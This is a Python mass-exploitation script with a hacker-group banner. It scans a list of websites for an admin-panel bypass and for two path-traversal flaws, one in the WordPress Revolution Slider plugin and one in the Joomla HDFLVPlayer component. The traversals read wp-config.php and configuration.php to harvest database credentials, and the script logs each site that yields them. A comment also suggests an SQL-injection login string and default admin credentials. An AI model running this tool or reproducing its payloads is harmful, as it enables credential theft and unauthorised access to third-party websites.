import http.client, sys, os, time
from platform import system
#HELP : 3 Exploit Bypass - revslider- hdflvp
#admin panel = BYpass use noredirect / or  user : 'or''='  pass: 'or''='   / or use  user : admin pass: admin ^^
def clearscr():
    if system() == 'Linux':
        os.system("clear")
    if system() == 'Windows':
        os.system('cls')
        os.system('color a')
    else:
        pass
clearscr()
 
 
def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(4. / 100)
 
print("""
  ______                      _       _     ____            _      __      __  __   _____ 
 |___  /                     | |     (_)   |  _ \          | |     \ \    / / /_ | | ____|
    / /    ___    _ __ ___   | |__    _    | |_) |   ___   | |_     \ \  / /   | | | |__  
   / /    / _ \  | '_ ` _ \  | '_ \  | |   |  _ <   / _ \  | __|     \ \/ /    | | |___ \ 
  / /__  | (_) | | | | | | | | |_) | | |   | |_) | | (_) | | |_       \  /     | |  ___) |
 /_____|  \___/  |_| |_| |_| |_.__/  |_|   |____/   \___/   \__|       \/      |_| |____/ 
                                                                                          
                                                                                          
 [+] ICQ: @viper1337official
 
 [+] Telegram: https://t.me/viper133777                                                                  
                """)
slowprint("Coded By: Viper 1337")
 
#------------------------------------------------------------------------
of = "/admin/login.php"
#----------------------------------------------------------------------------
jsk = "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php"
#----------------------------------------------------------------------------------
hdf = "/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php"
#------------------------------------------------------------------------------------------
try:
    q = input("Entre List Site: ")
    q = open(q, "r")
except:
    print ("Pffffff Entre List Sites  -_-")
 
for i in q:
    i = i.rstrip()
    try:
        if i[:7] == "http://":
            i = i.replace("http://", "")
        if i[:8] == "https://":
            i = i.replace("https://", "")
        if i[-1] == "/":
            i = i.replace("/", "")
################ BYPASS ##########################
        conn = http.client.HTTPConnection(i)
        conn.request("POST", of)
        conn = conn.getresponse()
        html = conn.read()
############ Config WP ###########################
        connwp = http.client.HTTPConnection(i)
        connwp.request("POST", jsk)
        connwp = connwp.getresponse()
        htmlwp = connwp.read()
############ Com HDFVLP ##########################
        connjm = http.client.HTTPConnection(i)
        connjm.request("POST", hdf)
        connjm = connjm.getresponse()
        htmljm = connjm.read()
##################################################################################
        if conn.status == 200:
            print(("CRACKED! ==========> "), i+ of)
            with open("Panel Admin Bypass.txt", "a") as res:
                res.writelines(i + of+ "\n")
#---------------------------------------------------------------------------------
        elif connwp.status == 200 and ("DB_USER" and "DB_PASSWORD" and "DB_HOST") in htmlwp:
            print(("CRACKED! ==========> "), i + jsk)
            with open("wordpres_Config.txt", "a") as wp1:
                wp1.writelines(i + jsk + "\n")
#----------------------------------------------------------------------------------
        elif connjm.status == 200 and ("$user" and "$host" and "$password") in htmljm:
            print(("CRACKED! ==========> "), i + hdf)
            with open("joomla_config.txt", "a") as jm1:
                jm1.writelines(i + hdf + "\n")
        else:
            print(("Admin Not Found : "), i)
#########################################################
    except:
        pass
